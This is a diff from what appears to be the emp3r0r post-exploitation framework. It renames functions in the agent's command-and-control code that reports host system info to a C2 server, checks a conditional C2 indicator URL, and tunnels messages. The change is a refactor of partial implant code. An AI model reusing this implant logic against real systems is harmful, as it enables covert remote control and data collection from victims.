@@ -23,12 +23,12 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
-// CheckIn poll CC server and report its system info
-func CheckIn(info *def.Emp3r0rAgent) (err error) {
-	checkin_URL := def.CCAddress + transport.CheckInAPI + "/" + uuid.NewString()
-	logging.Printf("Collected system info, now checking in (%s)", checkin_URL)
+// ReportStatus poll CC server and report its system info
+func ReportStatus(info *def.Emp3r0rAgent) (err error) {
+	reportStatusURL := def.CCAddress + transport.CheckInAPI + "/" + uuid.NewString()
+	logging.Printf("Collected system info, now reporting status (%s)", reportStatusURL)
 
-	conn, _, _, err := ConnectCC(checkin_URL)
+	conn, _, _, err := EstablishC2Connection(reportStatusURL)
 	if err != nil {
 		return err
 	}
@@ -41,8 +41,8 @@ func CheckIn(info *def.Emp3r0rAgent) (err error) {
 	return err
 }
 
-// ConditionalC2Yes check common.RuntimeConfig.CCIndicator for conditional C2 connetion
-func ConditionalC2Yes(proxy string) bool {
+// CheckC2Condition check common.RuntimeConfig.CCIndicator for conditional C2 connetion
+func CheckC2Condition(proxy string) bool {
 	logging.Printf("Checking CCIndicator: %s", common.RuntimeConfig.CCIndicatorURL)
 	t := &http.Transport{
 		Dial: (&net.Dialer{
@@ -57,7 +57,7 @@ func ConditionalC2Yes(proxy string) bool {
 			logging.Fatalf("invalid proxy: %v", err)
 		}
 		t.Proxy = http.ProxyURL(proxyUrl)
-		logging.Printf("IsCCOnline: using proxy %s", proxy)
+		logging.Printf("CheckC2Condition: using proxy %s", proxy)
 	}
 	client := http.Client{
 		Transport: t,
@@ -65,12 +65,12 @@ func ConditionalC2Yes(proxy string) bool {
 	}
 	resp, err := client.Get(common.RuntimeConfig.CCIndicatorURL)
 	if err != nil {
-		logging.Printf("IsCCOnline: %s: %v", common.RuntimeConfig.CCIndicatorURL, err)
+		logging.Printf("CheckC2Condition: %s: %v", common.RuntimeConfig.CCIndicatorURL, err)
 		return false
 	}
 	_, err = io.ReadAll(resp.Body)
 	if err != nil {
-		logging.Printf("IsCCOnline: %s: %v", common.RuntimeConfig.CCIndicatorURL, err)
+		logging.Printf("CheckC2Condition: %s: %v", common.RuntimeConfig.CCIndicatorURL, err)
 		return false
 	}
 	defer resp.Body.Close()
@@ -93,8 +93,8 @@ var (
 	HandShakesMutex = &sync.RWMutex{}
 )
 
-// CCMsgTun use the connection (CCConn)
-func CCMsgTun(callback func(*def.MsgTunData), ctx context.Context, cancel context.CancelFunc) (err error) {
+// MsgTunneler use the connection (CCConn)
+func MsgTunneler(callback func(*def.MsgTunData), ctx context.Context, cancel context.CancelFunc) (err error) {
 	var (
 		in  = json.NewDecoder(def.CCMsgConn)
 		out = json.NewEncoder(def.CCMsgConn)
@@ -104,12 +104,12 @@ func CCMsgTun(callback func(*def.MsgTunData), ctx context.Context, cancel contex
 	defer func() {
 		err = def.CCMsgConn.Close()
 		if err != nil {
-			logging.Print("CCMsgTun closing: ", err)
+			logging.Print("MsgTunneler closing: ", err)
 		}
 
 		cancel()
 		def.KCPKeep = false // tell KCPClient to close this conn so we won't stuck
-		logging.Print("CCMsgTun closed")
+		logging.Print("MsgTunneler closed")
 	}()
 
 	// check for CC server's response
@@ -211,5 +211,5 @@ func CCMsgTun(callback func(*def.MsgTunData), ctx context.Context, cancel contex
 		util.TakeASnap()
 	}
 
-	return fmt.Errorf("CCMsgTun closed: %v", ctx.Err())
+	return fmt.Errorf("MsgTunneler closed: %v", ctx.Err())
 }
